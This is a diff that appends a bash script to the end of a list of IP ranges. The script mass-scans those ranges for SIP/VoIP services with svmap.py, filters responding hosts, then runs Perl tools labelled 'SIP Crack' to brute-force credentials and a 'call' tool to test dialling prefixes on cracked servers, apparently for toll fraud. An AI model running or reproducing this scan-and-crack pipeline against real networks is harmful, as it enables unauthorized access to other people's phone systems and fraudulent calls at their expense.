@@ -6340,3 +6340,52 @@
 200.55.176.0/20
 201.220.192.0/20
 201.220.208.0/20
+
+
+
+#!/bin/bash
+
+# Scan IPv4 range on ports
+echo -e "\nStart scanning ...\n"
+
+while read -r ip; do
+	echo "Checking $ip";
+	python svmap.py $ip -p5060,6069,6079,6099,6089,5059,5260,6072,6073,7073,5080 -t0.0 -v >> output.txt
+done < ip.txt
+
+sleep 1
+
+grep -Po "(\d+\.){3}\d+:?(\d?){6}" output.txt >>ok.txt
+sort -u ok.txt > IPS
+rm ok.txt # remove the file IPS
+
+echo -e "\nEnding scanning port !\n"
+
+# SIP Responses
+
+echo -e "\nStart SIP Responses ...\n"
+
+perl run IPS
+cat 401.pal 403.pal 404.pal >> ipSIP
+rm IPS # remove the file IPS
+sleep 2
+
+# SIP Crack
+
+echo -e "\nStart SIP Crack ...\n"
+
+perl Crack 2500 1 ipSIP
+rm ipSIP # remove the file ipSIP
+rm *.pal # remove the file
+
+sleep 2
+
+# Testing SIP prefix
+
+echo -e "\nStart Testing ...\n"
+
+perl call VOIPresult 1000 30
+sleep 1
+
+echo -e "\nEnding crack !\n"
+echo -e "\nby Mohammad Elnwajha\n"
